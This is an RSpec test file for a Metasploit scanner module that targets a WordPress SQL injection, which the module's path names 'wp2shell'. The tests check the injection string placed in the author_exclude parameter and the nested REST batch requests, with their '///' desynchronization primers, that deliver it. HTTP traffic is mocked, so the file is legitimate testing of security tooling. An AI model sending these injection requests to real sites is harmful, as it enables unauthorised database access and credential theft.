require 'rspec'
require 'msfenv'
require 'msf/base'
require 'json'
require 'uri'

RSpec.describe 'WordPress wp2shell SQLi alias generation' do
  subject(:mod) { owner_class.new }

  let(:owner_class) do
    scope = Module.new
    source = ENV.fetch('WP2SHELL_ALIAS_OWNER_SOURCE', File.expand_path('../../../../../modules/auxiliary/scanner/http/wordpress_wp2shell_sqli.rb', __dir__))
    scope.module_eval(File.binread(source), source)
    scope.const_get(:MetasploitModule).tap { |klass| klass.include(Msf) }
  end
  let(:capture) do
    JSON.parse(File.read(File.join(__dir__, '../../../../file_fixtures/modules/auxiliary/scanner/http/wordpress_wp2shell_sqli/alias_errors.json')))
  end
  let(:record) { capture.fetch('queries').find { |row| row.fetch('alias') == 'join' } }
  let(:alias_token) { record.fetch('alias') }
  let(:payload) { record.fetch('payload') }
  let(:scalar) { capture.fetch('synthetic_unit_scalar') }
  let(:http_response) { double('HTTP response') }
  let(:requests) { [] }

  before do
    mod.datastore.merge!('RHOSTS' => '192.0.2.10', 'RHOST' => '192.0.2.10', 'RPORT' => 8080, 'TARGETURI' => '/')
    allow(mod).to receive(:rand).with(1000..9999).and_return(scalar)
    allow(Rex::Text).to receive(:rand_text_alpha).with(4).and_return(alias_token)
    allow(mod).to receive(:send_request_cgi) do |options|
      requests << options.deep_dup
      http_response
    end
  end

  # These cases invoke the real inject and batch_post methods and JSON/URI
  # serialization. RNG draws and HTTP responses are explicit doubles. Aliases
  # and inner expressions come from native controls; the in-range unit scalar
  # and expected owner wrapper are synthetic. Native controls used scalar313,
  # DELETE and http://: rather than the owner's GET and /// primer. These tests
  # establish callback contracts, not SQL execution or recovered credentials.

  %w[join like desc left].each do |captured_alias|
    context "with captured rejected alias #{captured_alias}" do
      let(:record) { capture.fetch('queries').find { |row| row.fetch('alias') == captured_alias } }

      it 'quotes the identifier while preserving the captured inner expression' do
        mod.inject(payload)

        expect(injected_value(requests.last)).to eq("0) AND (SELECT #{scalar} FROM (SELECT(#{payload}))`#{alias_token}`)-- -")
      end
    end
  end

  %w[nati AbCd JoIn].each do |synthetic_alias|
    context "with synthetic alias #{synthetic_alias}" do
      let(:alias_token) { synthetic_alias }

      it 'uses the same quoted identifier contract' do
        mod.inject(payload)

        expect(injected_value(requests.last)).to eq("0) AND (SELECT #{scalar} FROM (SELECT(#{payload}))`#{alias_token}`)-- -")
      end
    end
  end

  it 'keeps the public JSON batch request and plain-permalink endpoint' do
    mod.inject(payload)

    expect(requests.last.slice('method', 'uri', 'vars_get', 'ctype')).to eq(
      'method' => 'POST', 'uri' => '/', 'vars_get' => { 'rest_route' => '/batch/v1' }, 'ctype' => 'application/json'
    )
  end

  it 'joins a real subdirectory to the batch endpoint' do
    mod.datastore['TARGETURI'] = '/wordpress/'
    mod.inject(payload)

    expect(requests.last.fetch('uri')).to eq('/wordpress/')
  end

  it 'keeps the GET item source used by the owner' do
    mod.inject(payload)

    inner_request = JSON.parse(requests.last.fetch('data')).dig('requests', 1, 'body', 'requests', 1)
    expect([inner_request.fetch('method'), URI.parse(inner_request.fetch('path')).path]).to eq(['GET', '/wp/v2/posts/999999'])
  end

  it 'retains both desynchronization primers and following handlers' do
    mod.inject(payload)

    outer = JSON.parse(requests.last.fetch('data')).fetch('requests')
    inner = outer.fetch(1).fetch('body').fetch('requests')
    expect([outer.first, outer.fetch(1).slice('method', 'path'), outer.last, inner.first, inner.last]).to eq([
      { 'method' => 'POST', 'path' => '///' },
      { 'method' => 'POST', 'path' => '/wp/v2/posts' },
      { 'method' => 'POST', 'path' => '/batch/v1', 'body' => { 'requests' => [] } },
      { 'method' => 'POST', 'path' => '///' },
      { 'method' => 'GET', 'path' => '/wp/v2/posts' }
    ])
  end

  [1000, 9999].each do |boundary|
    context "at random scalar boundary #{boundary}" do
      let(:scalar) { boundary }

      it 'preserves the scalar and native expression' do
        mod.inject(payload)

        expect(injected_value(requests.last)).to eq("0) AND (SELECT #{scalar} FROM (SELECT(#{payload}))`#{alias_token}`)-- -")
      end
    end
  end

  it 'draws a fresh scalar and alias for each invocation' do
    allow(mod).to receive(:rand).with(1000..9999).and_return(1000, 9999)
    allow(Rex::Text).to receive(:rand_text_alpha).with(4).and_return('join', 'like')
    mod.inject(payload)
    mod.inject(payload)

    expect(requests.map { |request| injected_value(request) }).to eq([
      "0) AND (SELECT 1000 FROM (SELECT(#{payload}))`join`)-- -",
      "0) AND (SELECT 9999 FROM (SELECT(#{payload}))`like`)-- -"
    ])
  end

  context 'when the batch request receives no response' do
    let(:http_response) { nil }

    it 'preserves the explicit unreachable failure' do
      expect { mod.inject(payload) }.to raise_error(Msf::Auxiliary::Scanner::AttemptFailed, /unreachable: .*Connection failed/)
    end
  end

  def injected_value(request)
    document = JSON.parse(request.fetch('data'))
    path = document.dig('requests', 1, 'body', 'requests', 1, 'path')
    URI.decode_www_form(URI.parse(path).query).to_h.fetch('author_exclude')
  end
end
